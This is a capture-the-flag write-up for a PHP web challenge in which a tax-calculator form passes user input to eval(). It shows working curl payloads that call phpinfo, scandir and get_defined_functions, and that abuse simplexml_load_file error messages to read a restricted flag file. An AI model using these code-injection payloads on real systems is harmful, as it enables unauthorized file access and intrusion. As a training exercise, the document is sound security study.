# Corporate Tax Calculator

## Description

Our website help corporates to calculate their annual taxes, Our developers said it's sand-boxed can you double check for me?

## Solution

![Corporate Tax Calculator.png](/assets/ctf/idex.ctf.ae/2025/web/Corporate Tax Calculator.png)

Post request on `/` evaluates given math expression

![Corporate Tax Calculator-1.png](/assets/ctf/idex.ctf.ae/2025/web/Corporate Tax Calculator-1.png)

If we cause an error we see `eval` function is used, which is considered to be dangerous for RCE.

![Corporate Tax Calculator-2.png](/assets/ctf/idex.ctf.ae/2025/web/Corporate Tax Calculator-2.png)

`system('id')` didn't work, use `phpinfo()` to inspect configuration. Our interest is in `disable_functions` which restricts which functions are allowed.

![Corporate Tax Calculator-3.png](/assets/ctf/idex.ctf.ae/2025/web/Corporate Tax Calculator-3.png)


With `scandir` we can locate files
```bash
└─$ curl 'https://c364ef9d450b579d4493f1e85bfe2e34.chal.ctf.ae/' -d 'eqn=print_r(scandir("../../../"))'
Array
(
    [0] => .
    [1] => ..
    [2] => Sup333r_S3cret_Flaaa@ag.txt
    [3] => bin
    [4] => boot
    [5] => dev
    [6] => etc
    [7] => home
    [8] => init.sh
    [9] => lib
    [10] => lib64
    [11] => media
    [12] => mnt
    [13] => opt
    [14] => proc
    [15] => root
    [16] => run
    [17] => sbin
    [18] => srv
    [19] => sys
    [20] => tmp
    [21] => usr
    [22] => var
)
1
```

![Corporate Tax Calculator-4.png](/assets/ctf/idex.ctf.ae/2025/web/Corporate Tax Calculator-4.png)

Now we just have to read it somehow.

[https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-web/php-tricks-esp/php-useful-functions-disable_functions-open_basedir-bypass/index.html#filesystem-functions](https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-web/php-tricks-esp/php-useful-functions-disable_functions-open_basedir-bypass/index.html#filesystem-functions)

```bash
└─$ curl 'https://c364ef9d450b579d4493f1e85bfe2e34.chal.ctf.ae/' -d 'eqn=print_r(get_defined_functions())' -s | grep -i file
            [28] => get_included_files
            [29] => get_required_files
            [111] => openssl_x509_export_to_file
            [120] => openssl_pkcs12_export_to_file
            [123] => openssl_csr_export_to_file
            [130] => openssl_pkey_export_to_file
            [229] => curl_file_create
            [255] => finfo_file
            [302] => hash_file
            [304] => hash_hmac_file
            [308] => hash_update_file
            [470] => simplexml_load_file
            [613] => is_uploaded_file
            [614] => move_uploaded_file
            [615] => parse_ini_file
            [636] => md5_file
            [643] => sha1_file
            [765] => tmpfile
            [771] => fileatime
            [772] => filectime
            [773] => filegroup
            [774] => fileinode
            [775] => filemtime
            [776] => fileowner
            [777] => fileperms
            [778] => filesize
            [779] => filetype
            [780] => file_exists
            [785] => is_file
            [820] => php_ini_scanned_files
            [821] => php_ini_loaded_file
            [916] => set_file_buffer
```

After some digging I found `simplexml_load_file` function which is able to read first line of file which is enough for `flag.txt`.
```bash
└─$ curl 'https://c364ef9d450b579d4493f1e85bfe2e34.chal.ctf.ae/' -d 'eqn=print_r(simplexml_load_file("/Sup333r_S3cret_Flaaa@ag.txt"))'
<br />
<b>Warning</b>:  simplexml_load_file(): /Sup333r_S3cret_Flaaa@ag.txt:1: parser error : Start tag expected, '&lt;' not found in <b>/var/www/html/index.php(5) : eval()'d code</b> on line <b>1</b><br />
<br />
<b>Warning</b>:  simplexml_load_file(): flag{fgP37WI1T4N50VgsDMu18jwvpWKqJohR} in <b>/var/www/html/index.php(5) : eval()'d code</b> on line <b>1</b><br />
<br />
<b>Warning</b>:  simplexml_load_file(): ^ in <b>/var/www/html/index.php(5) : eval()'d code</b> on line <b>1</b><br />
1 
```

> Flag: `flag{fgP37WI1T4N50VgsDMu18jwvpWKqJohR}`

